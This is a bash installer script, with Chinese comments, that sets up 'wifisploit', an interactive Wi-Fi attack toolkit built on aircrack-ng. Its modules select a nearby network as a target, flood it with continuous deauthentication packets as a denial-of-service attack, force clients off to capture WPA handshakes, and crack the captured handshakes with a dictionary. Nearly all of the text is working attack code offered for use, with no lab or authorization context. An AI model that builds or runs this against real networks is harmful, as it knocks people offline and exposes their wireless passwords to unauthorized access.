#!/bin/bash

# 创建目录结构
mkdir -p wifisploit/modules

# 复制脚本到相应目录
cat << 'EOF' > wifisploit/modules/set_monitor_mode.sh
#!/bin/bash

INTERFACE=$1

if [ -z "$INTERFACE" ]; then
  echo "Usage: $0 <interface>"
  exit 1
fi

echo "将$INTERFACE设置为监听模式..."
airmon-ng start $INTERFACE

MONITOR_INTERFACE=$(iw dev | awk '$1=="Interface"{print $2}' | grep -E "^mon")

if [ -z "$MONITOR_INTERFACE" ]; then
  echo "未能成功将网卡设置为监听模式，请检查网卡及airmon-ng工具的状态。"
  exit 1
fi

echo "$INTERFACE 已设置为监听模式 $MONITOR_INTERFACE"
echo $MONITOR_INTERFACE > /tmp/current_monitor_interface
EOF

cat << 'EOF' > wifisploit/modules/scan_networks.sh
#!/bin/bash

MONITOR_INTERFACE=$(cat /tmp/current_monitor_interface)

if [ -z "$MONITOR_INTERFACE" ]; then
  echo "请先将网卡设置为监听模式。"
  exit 1
fi

echo "开始扫描周围网络..."
airodump-ng $MONITOR_INTERFACE > /tmp/network_scan.txt &

sleep 10  # 扫描10秒

kill $!

# 显示扫描结果并让用户选择目标
awk 'BEGIN{print "编号\tBSSID\t\t\t频道\t加密\t信号\tSSID"}
     /^[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}/ {
         printf "%d\t%s\t%s\t%s\t%s\t%s\n", NR, $1, $6, $8, $4, $14
     }' /tmp/network_scan.txt

read -p "选择目标网络的编号: " TARGET_NUMBER

TARGET_BSSID=$(awk -v num=$TARGET_NUMBER 'BEGIN{FS="\t"} NR==num+1 {print $2}' /tmp/network_scan.txt)
TARGET_CHANNEL=$(awk -v num=$TARGET_NUMBER 'BEGIN{FS="\t"} NR==num+1 {print $3}' /tmp/network_scan.txt)

echo $TARGET_BSSID > /tmp/current_target_bssid
echo $TARGET_CHANNEL > /tmp/current_target_channel

echo "已选择目标网络: BSSID=$TARGET_BSSID, 频道=$TARGET_CHANNEL"
EOF

cat << 'EOF' > wifisploit/modules/dos_attack.sh
#!/bin/bash

MONITOR_INTERFACE=$(cat /tmp/current_monitor_interface)
TARGET_BSSID=$(cat /tmp/current_target_bssid)

if [ -z "$MONITOR_INTERFACE" ] || [ -z "$TARGET_BSSID" ]; then
  echo "请先选择目标网络。"
  exit 1
fi

echo "开始对目标网络进行Dos攻击..."
aireplay-ng --deauth 0 -a $TARGET_BSSID $MONITOR_INTERFACE
EOF

cat << 'EOF' > wifisploit/modules/capture_handshake.sh
#!/bin/bash

MONITOR_INTERFACE=$(cat /tmp/current_monitor_interface)
TARGET_BSSID=$(cat /tmp/current_target_bssid)
TARGET_CHANNEL=$(cat /tmp/current_target_channel)

if [ -z "$MONITOR_INTERFACE" ] || [ -z "$TARGET_BSSID" ] || [ -z "$TARGET_CHANNEL" ]; then
  echo "请先选择目标网络。"
  exit 1
fi

echo "开始对目标网络进行监视并捕获握手包..."
airodump-ng --bssid $TARGET_BSSID --channel $TARGET_CHANNEL --write capture $MONITOR_INTERFACE &

AIRODUMP_PID=$!

sleep 5

echo "踢出目标网络中的一台设备以获取握手包..."
aireplay-ng --deauth 5 -a $TARGET_BSSID $MONITOR_INTERFACE

sleep 10

kill $AIRODUMP_PID

# 检查是否已捕获到握手包
if [ -f capture-01.cap ]; then
  echo "成功捕获到握手包，保存在 capture-01.cap"
else
  echo "未捕获到握手包，请重试或检查目标网络状态。"
  exit 1
fi
EOF

cat << 'EOF' > wifisploit/modules/crack_handshake.sh
#!/bin/bash

CAPTURE_FILE="capture-01.cap"
TARGET_BSSID=$(cat /tmp/current_target_bssid)
DICTIONARY_PATH=$1

if [ -z "$DICTIONARY_PATH" ]; then
  echo "Usage: $0 <dictionary_path>"
  exit 1
fi

if [ ! -f "$CAPTURE_FILE" ]; then
  echo "捕获文件不存在，请检查路径后重试。"
  exit 1
fi

if [ ! -f "$DICTIONARY_PATH" ]; then
  echo "字典文件不存在，请检查路径后重试。"
  exit 1
fi

echo "开始使用$DICTIONARY_PATH进行暴力破解..."
aircrack-ng -w $DICTIONARY_PATH -b $TARGET_BSSID $CAPTURE_FILE
EOF

cat << 'EOF' > wifisploit/modules/show_target.sh
#!/bin/bash

TARGET_BSSID=$(cat /tmp/current_target_bssid 2>/dev/null)
TARGET_CHANNEL=$(cat /tmp/current_target_channel 2>/dev/null)

if [ -z "$TARGET_BSSID" ] || [ -z "$TARGET_CHANNEL" ]; then
  echo "未选择目标网络。"
else
  echo "当前目标网络: BSSID=$TARGET_BSSID, 频道=$TARGET_CHANNEL"
fi
EOF

cat << 'EOF' > wifisploit/wifisploit.sh
#!/bin/bash

function show_help {
  echo "Commands:"
  echo "  set_monitor_mode (smm) <interface>       将指定网卡设置为监听模式"
  echo "  scan_networks (sn)                       扫描周围的无线网络"
  echo "  dos_attack (da)                          对当前目标网络进行Dos攻击"
  echo "  capture_handshake (ch)                   捕获当前目标网络的握手包"
  echo "  crack_handshake (crh) <dictionary_path>  使用字典文件破解握手包"
  echo "  show_target (st)                         显示当前选择的目标网络"
  echo "  help (h)                                 显示此帮助信息"
  echo "  exit (e)                                 退出交互模式"
}

function main_menu {
  while true; do
    echo -n "wifisploit> "
    read -r CMD ARGS

    case "$CMD" in
      set_monitor_mode|smm)
        modules/set_monitor_mode.sh $ARGS
        ;;
      scan_networks|sn)
        modules/scan_networks.sh
        ;;
      dos_attack|da)
        modules/dos_attack.sh
        ;;
      capture_handshake|ch)
        modules/capture_handshake.sh
        ;;
      crack_handshake|crh)
        modules/crack_handshake.sh $ARGS
        ;;
      show_target|st)
        modules/show_target.sh
        ;;
      help|h)
        show_help
        ;;
      exit|e)
        break
        ;;
      *)
        echo "未知命令: $CMD"
        show_help
        ;;
    esac
  done
}

# 显示帮助信息并进入主菜单
show_help
main_menu
EOF

# 设置脚本执行权限
chmod +x wifisploit/modules/*.sh
chmod +x wifisploit/wifisploit.sh

echo "wifisploit 工具已成功部署。"
echo "使用方法：进入 wifisploit 目录并运行 ./wifisploit.sh 进入交互模式。"

